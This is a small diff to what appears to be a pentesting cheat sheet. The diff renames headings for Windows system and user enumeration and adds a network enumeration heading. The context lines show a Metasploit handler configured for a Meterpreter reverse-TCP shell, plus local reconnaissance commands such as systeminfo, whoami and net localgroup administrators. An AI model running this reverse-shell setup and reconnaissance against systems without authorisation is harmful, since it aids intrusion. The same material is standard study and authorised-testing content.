@@ -8,7 +8,7 @@ use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
 ```
 
-# Windows Shell Check System info
+# Windows System Enumeration 
 ```
 systeminfo
 
@@ -25,7 +25,7 @@ wmic logicaldisk get caption,description,providername
 wmic logicaldisk get caption
 ```
 
-# Windows User info
+# Windows User Enumeration 
 ```
 whoami
 
@@ -41,3 +41,5 @@ net localgroup
 
 net localgroup administrators
 ```
+
+#Windows Network Enumeration 
